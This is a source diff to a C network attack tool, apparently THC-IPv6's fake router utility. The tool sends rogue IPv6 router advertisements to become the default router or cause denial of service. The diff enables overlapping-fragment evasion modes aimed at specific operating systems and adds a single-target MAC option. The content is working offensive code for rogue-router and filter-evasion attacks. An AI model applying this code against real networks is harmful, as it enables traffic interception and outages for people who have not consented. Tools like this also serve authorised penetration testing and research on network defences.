@@ -42,10 +42,11 @@ void help(char *prg) {
   printf("     H             simple hop-by-hop header\n");
   printf("     1             simple one-shot fragmentation header (can add multiple)\n");
   printf("     D             insert a large destination header so that it fragments\n");
-//  printf("     O             overlapping fragments for keep-first targets (Win, BSD, Mac)\n");
-//  printf("     o             overlapping fragments for keep-last targets (Linux, Solaris)\n");
+  printf("     O             overlapping fragments for keep-first targets (Win, BSD, Mac)\n");
+  printf("     o             overlapping fragments for keep-last targets (Linux, Solaris)\n");
   printf("                    Examples: -E H111, -E D\n");      //, -E O, -E o (the last two are best)\n");
   printf(" -n number         number of RAs to send (default: unlimited)\n");
+  printf(" -m mac-address    if only one machine should receive the RAs (not with -E DoO)\n");
   printf("\nAnnounce yourself as a router and try to become the default router.\n");
   printf("If a non-existing link-local or mac address is supplied, this results in a DOS.\n");
 //  printf("Use -r to use raw mode.\n\n");
@@ -93,7 +94,7 @@ void send_rs_reply(u_char *foo, const struct pcap_pkthdr *header, const unsigned
 
 
 int main(int argc, char *argv[]) {
-  char *interface, mac[16] = "";
+  char *interface, mac[16] = "", dmac[16] = "";
   unsigned char *routerip6, *mac6 = NULL, *ip6 = NULL;
   unsigned char buf[512], *ptr, buf2[6], buf4[6], string[] = "ip6 and icmp6 and dst ff02::2";
   unsigned char rbuf[MAX_ENTRIES + 1][17], pbuf[MAX_ENTRIES + 1][17], *dbuf[MAX_ENTRIES + 1];
@@ -111,8 +112,13 @@ int main(int argc, char *argv[]) {
   memset(rbuf, 0, sizeof(rbuf));
   memset(mac, 0, sizeof(mac));
 
-  while ((i = getopt(argc, argv, "r:E:R:M:S:s:D:L:A:a:r:d:t:T:p:n:l:F:")) >= 0) {
+  while ((i = getopt(argc, argv, "r:E:R:M:m:S:s:D:L:A:a:r:d:t:T:p:n:l:F:")) >= 0) {
     switch (i) {
+    case 'm':
+      sscanf(optarg, "%x:%x:%x:%x:%x:%x", (unsigned int *) &dmac[0], (unsigned int *) &dmac[1], (unsigned int *) &dmac[2], (unsigned int *) &dmac[3], (unsigned int *) &dmac[4],
+             (unsigned int *) &dmac[5]);
+      dstmac = dmac;
+      break;
     case 'S':
       sscanf(optarg, "%x:%x:%x:%x:%x:%x", (unsigned int *) &mac[0], (unsigned int *) &mac[1], (unsigned int *) &mac[2], (unsigned int *) &mac[3], (unsigned int *) &mac[4],
              (unsigned int *) &mac[5]);
@@ -248,11 +254,9 @@ int main(int argc, char *argv[]) {
         case '0':              // fall through
         case 'O':
           do_overlap = 1;
-//          break;
+          break;
         case 'o':
           do_overlap = 2;
-          printf("Option O is not implemented yet\n");
-          exit(-1);
           break;
         case '1':              // fall through
         case 'l':              // fall through
@@ -492,16 +496,7 @@ int main(int argc, char *argv[]) {
       if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, getpid() + (cnt++ << 16)) < 0)
         return -1;
   }
-  if (do_overlap) {
-    memset(buf4, 0, sizeof(buf4));
-    buf4[0] = 38;
-    buf4[1] = 128;
-    buf4[2] = getpid() % 256;
-    buf4[3] = getpid() / 256;
-    buf4[4] = cnt % 256;
-    buf4[5] = cnt / 256;
-    thc_add_hdr_misc(pkt, &pkt_len, NXT_FRAG, -1, buf4, sizeof(buf4));
-  }
+
   if (do_dst) {
     if (type == NXT_ICMP6)
       type = NXT_DST;
@@ -515,34 +510,6 @@ int main(int argc, char *argv[]) {
   frhdr = (thc_ipv6_hdr *) pkt;
 //printf("DEBUG: RA size is %d bytes, do_dst %d, do_overlap %d\n", i + 8, do_dst, do_overlap);
 
-  // now the fragmentation evasion mechanisms
-
-  if (do_overlap) {
-//printf("DO OVERLAP\n");
-    if ((pkt1 = thc_create_ipv6(interface, PREFER_LINK, &pkt_len1, ip6, dst, 255, 0, 0, 0xe0, 0)) == NULL)
-      return -1;
-    memset(buf4, 0, sizeof(buf4));
-    buf4[1] = 1;
-    buf4[2] = getpid() % 256;
-    buf4[3] = getpid() / 256;
-    buf4[4] = cnt % 256;
-    buf4[5] = cnt / 256;
-    cnt++;
-    thc_add_hdr_misc(pkt1, &pkt_len1, NXT_FRAG, -1, buf4, sizeof(buf4));
-    if (thc_add_hdr_dst(pkt1, &pkt_len1, buf3, sizeof(buf3) - 4) < 0)
-      return -1;
-    if (thc_add_icmp6(pkt1, &pkt_len1, ICMP6_ECHOREQUEST, 0, getpid() + ((cnt + i) << 16), buf3, 8, 0) < 0)
-      return -1;
-    if (thc_generate_pkt(interface, mac6, dstmac, pkt1, &pkt_len1) < 0)
-      return -1;
-
-/*
-thc_send_pkt(interface, pkt1, &pkt_len1);
-thc_send_pkt(interface, pkt, &pkt_len);
-thc_send_pkt(interface, pkt1, &pkt_len1);
-exit(0);
-*/ }
-
   // init pcap
   if ((p = thc_pcap_init(interface, string)) == NULL) {
     fprintf(stderr, "Error: could not capture on interface %s with string %s\n", interface, string);
@@ -554,18 +521,10 @@ exit(0);
     if (do_dst) {
       thc_send_as_fragment6(interface, ip6, dst, type, frhdr->pkt + 40 + myoff, frhdr->pkt_len - 40 - myoff, 1232);
     } else if (do_overlap) {
-
-      thc_send_pkt(interface, pkt1, &pkt_len1);
-
-//      printf("dummy, inc fragid, send\n");
-
-      thc_send_pkt(interface, pkt1, &pkt_len1);
-      thc_send_pkt(interface, pkt2, &pkt_len2);
-
-//      printf("dummy, inc fragid, send\n");
-
-      thc_send_pkt(interface, pkt2, &pkt_len2);
-      thc_send_pkt(interface, pkt1, &pkt_len1);
+      if (do_overlap == 1)
+        thc_send_as_overlapping_first_fragment6(interface, ip6, dst, type, frhdr->pkt + 40 + myoff, frhdr->pkt_len - 40 - myoff, 1232, 0);
+      else
+        thc_send_as_overlapping_last_fragment6(interface, ip6, dst, type, frhdr->pkt + 40 + myoff, frhdr->pkt_len - 40 - myoff, 1232, 0);
     } else {
       thc_send_pkt(interface, pkt, &pkt_len);
     }
